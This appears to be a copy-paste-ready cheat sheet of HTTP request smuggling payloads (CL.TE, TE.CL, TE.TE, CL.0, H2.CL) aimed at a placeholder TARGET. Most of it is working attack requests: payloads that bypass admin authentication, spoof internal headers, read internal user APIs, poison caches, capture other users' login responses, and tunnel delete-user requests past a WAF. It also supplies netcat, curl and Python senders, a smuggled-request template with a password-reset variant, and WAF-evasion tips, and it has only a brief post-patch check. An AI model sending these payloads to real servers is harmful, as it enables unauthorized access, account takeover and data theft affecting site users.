# Quick Reference Payloads - Copy-Paste Ready

Fast access to all payloads. Replace `TARGET` and `PORT` before use.

---

## DETECTION PAYLOADS

### CL.TE Detection (Most Common)

```
POST / HTTP/1.1
Host: TARGET
Content-Length: 4
Transfer-Encoding: chunked
Connection: keep-alive

1
A
X
```

**Expected:** 5-7 second timeout, then hangs
**Confidence:** 30 points if timeout

---

### TE.CL Detection

```
POST / HTTP/1.1
Host: TARGET
Transfer-Encoding: chunked
Content-Length: 6
Connection: keep-alive

0

X
```

**Expected:** 5-7 second timeout
**Confidence:** 30 points if timeout

---

### TE.TE Variant 1 (xchunked)

```
POST / HTTP/1.1
Host: TARGET
Transfer-Encoding: xchunked
Transfer-Encoding: chunked
Connection: keep-alive

0

X
```

**Expected:** Variable response
**Confidence:** 10 points if different from normal

---

### TE.TE Variant 2 (space/tab)

```
POST / HTTP/1.1
Host: TARGET
Transfer-Encoding: chunked
Transfer-Encoding: [space]chunked
Connection: keep-alive

0

X
```

(Replace `[space]` with actual space or tab character)

**Confidence:** 10 points

---

### TE.TE Variant 3 (line break)

```
POST / HTTP/1.1
Host: TARGET
Transfer-Encoding: chunked
Transfer-Encoding
 : chunked
Connection: keep-alive

0

X
```

(Line break after `Transfer-Encoding`, then space before `:`)

**Confidence:** 10 points

---

### CL.0 (Browser Desync)

```
POST / HTTP/1.1
Host: TARGET
Content-Length: 0
Connection: keep-alive

GET /admin HTTP/1.1
Host: TARGET

```

**Expected:** Next request returns 404 for /admin if vulnerable
**Confidence:** 35 points if confirmed

---

### H2.CL (HTTP/2 + Content-Length)

Requires h2load or Burp HTTP/2:

```
:method: POST
:path: /
:scheme: https
:authority: TARGET
content-length: 13

Hello, World!SMUGGLED_DATA
```

**Expected:** Timeout or differential response
**Confidence:** 30 points

---

## DIFFERENTIAL RESPONSE PAYLOADS

### 404 Injection Test

```
POST / HTTP/1.1
Host: TARGET
Content-Length: 4
Transfer-Encoding: chunked
Connection: keep-alive

1
A
0

GET /does-not-exist-xyz HTTP/1.1
Host: TARGET

[Wait 1-2 seconds, then send:]

GET / HTTP/1.1
Host: TARGET
```

**Expected:** Response 1 = 200 OK, Response 2 = 404 NOT FOUND
**Confirmation:** 35 points (DEFINITIVE PROOF)

---

### Method Confusion Test

```
POST / HTTP/1.1
Host: TARGET
Content-Length: 4
Transfer-Encoding: chunked

1
A
0

DELETE /api/account HTTP/1.1
Host: TARGET
Content-Length: 0

```

**Expected:** Account deletion attempted (if implemented)
**Confirmation:** 35 points

---

### Response Header Leak

```
POST / HTTP/1.1
Host: TARGET
Content-Length: 4
Transfer-Encoding: chunked

1
A
0

GET / HTTP/1.1
Host: TARGET

```

**Expected:** Response shows internal headers
**Confirmation:** +15 points

Typical leaks:
```
X-Backend-IP: 10.0.0.5
X-Forwarded-Server: internal-app-1
Server: Apache/2.4.1-INTERNAL
X-Powered-By: CustomFramework/1.0
X-Debug-Mode: true
```

---

## EXPLOITATION PAYLOADS

### Admin Access Bypass

```
POST / HTTP/1.1
Host: TARGET
Content-Length: 4
Transfer-Encoding: chunked

1
A
0

GET /admin HTTP/1.1
Host: TARGET

```

**Expected:** 200 OK with admin dashboard HTML
**Impact:** CRITICAL (admin access without auth)

---

### Admin Access with Header Injection

```
POST / HTTP/1.1
Host: TARGET
Content-Length: 4
Transfer-Encoding: chunked

1
A
0

GET /admin HTTP/1.1
X-Forwarded-For: 127.0.0.1
X-Forwarded-User: admin
X-Forwarded-Role: administrator
Host: TARGET

```

**Expected:** 200 OK (admin accepts internal headers)
**Impact:** CRITICAL

---

### Internal API Access

```
POST / HTTP/1.1
Host: TARGET
Content-Length: 4
Transfer-Encoding: chunked

1
A
0

GET /internal/api/users HTTP/1.1
Host: TARGET

```

**Expected:** JSON list of users
**Impact:** CRITICAL (data exposure)

---

### Cache Poisoning

```
POST / HTTP/1.1
Host: TARGET
Content-Length: 4
Transfer-Encoding: chunked

1
A
0

GET /index.html HTTP/1.1
X-Forwarded-For: 127.0.0.1
Host: TARGET

```

Then normal user request:
```
GET /index.html HTTP/1.1
Host: TARGET
```

**Expected:** Normal user sees response from your /index.html request (from cache)
**Impact:** CRITICAL (affects all users)

---

### Credential Capture (Response Queue)

```
POST / HTTP/1.1
Host: TARGET
Content-Length: 4
Transfer-Encoding: chunked

1
A
0

GET / HTTP/1.1
Host: TARGET

[Leave connection open, wait for other user to login on same connection]

[Receive: User's login response with credentials]
```

**Expected:** Other user's login response received
**Impact:** CRITICAL (account takeover)

---

### Request Tunneling (Hide from Frontend)

```
POST / HTTP/1.1
Host: TARGET
Content-Length: 4
Transfer-Encoding: chunked

0

POST /admin/delete-user HTTP/1.1
Host: TARGET
Content-Length: 20

user_id=12345&admin=1
```

**Expected:** Admin endpoint accessed without frontend seeing it
**Impact:** CRITICAL (bypass WAF)

---

## TESTING PAYLOADS

### Baseline Timing Test

```
POST / HTTP/1.1
Host: TARGET
Content-Type: application/json
Connection: keep-alive

{"test": "data"}
```

**Purpose:** Get normal response time (~200-500ms)
**Use:** Compare against attack payloads

---

### False Positive Check (Normal TE Request)

```
POST / HTTP/1.1
Host: TARGET
Transfer-Encoding: chunked
Connection: keep-alive

D
Hello, World!
0

```

**Purpose:** Verify that VALID chunked requests work
**Expected:** Normal 200 OK response
**Use:** Distinguish real vuln from malformed requests

---

### WAF Bypass Test

```
POST / HTTP/1.1
Host: TARGET
Content-Length: 4
Transfer-Encoding: chunked
X-Forwarded-For: 127.0.0.1
X-Forwarded-Proto: https
Via: 1.1 proxy

1
A
0

GET /admin HTTP/1.1
X-Forwarded-For: 127.0.0.1
Host: TARGET
```

**Purpose:** Test if headers help bypass WAF rules
**Expected:** May bypass WAF rules on frontend

---

## MITIGATION VERIFICATION

### Post-Patch Testing

After vendor patches, verify fix:

```
[Send original CL.TE payload]

Expected: 
- No longer times out
- Returns error (e.g., "Bad request")
- Rejects Transfer-Encoding header
- Normalizes headers
```

---

## Tools for Sending Payloads

### Using netcat (Linux/Mac):

```bash
cat << 'EOF' | nc TARGET 80
POST / HTTP/1.1
Host: TARGET
Content-Length: 4
Transfer-Encoding: chunked
Connection: keep-alive

1
A
X
EOF
```

### Using Burp Suite:

1. Open Repeater
2. Paste payload from above
3. Click "Send"
4. Observe timing and response

### Using curl (with custom headers):

```bash
curl -X POST \
  -H "Content-Length: 4" \
  -H "Transfer-Encoding: chunked" \
  -d $'1\nA\nX' \
  http://TARGET/
```

### Using Python:

```python
import socket

payload = """POST / HTTP/1.1\r
Host: TARGET\r
Content-Length: 4\r
Transfer-Encoding: chunked\r
Connection: keep-alive\r
\r
1\r
A\r
X"""

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(('TARGET', 80))
sock.sendall(payload.encode())
response = sock.recv(4096)
print(response.decode())
sock.close()
```

---

## Payload Template Generator

For custom targets, use this template:

```
POST / HTTP/1.1
Host: [INSERT_TARGET_HERE]
Content-Length: 4
Transfer-Encoding: chunked
Connection: keep-alive

1
A
0

[INSERT_SMUGGLED_REQUEST_HERE]
```

Variations:

```
[INSERT_SMUGGLED_REQUEST_HERE] options:

GET /admin HTTP/1.1
Host: [TARGET]

GET /api/users HTTP/1.1
Host: [TARGET]

GET /internal/config HTTP/1.1
Host: [TARGET]

DELETE /user/123 HTTP/1.1
Host: [TARGET]

POST /admin/reset-password HTTP/1.1
Host: [TARGET]
Content-Length: 50

username=admin&new_password=newpass123
```

---

## Success Indicators Checklist

✅ Timing delay > 5 seconds (CL.TE/TE.CL)
✅ Different response to differential test
✅ 404 response for non-existent path
✅ 200 OK for /admin without auth
✅ Response headers show internal IPs
✅ JSON response with user data
✅ Next request returns different response

**If ANY checked:** VULNERABLE

---

## Common Errors & Fixes

| Error | Cause | Fix |
|-------|-------|-----|
| No response | Firewall blocking | Use HTTPS, port 443 |
| Normal 200 OK | Not vulnerable | Try different variant |
| Connection refused | Target down | Check target online |
| CRLF mismatch | Payload format | Ensure `\r\n` not `\n` |
| WAF block | WAF detected attack | Add X-Forwarded-For headers |

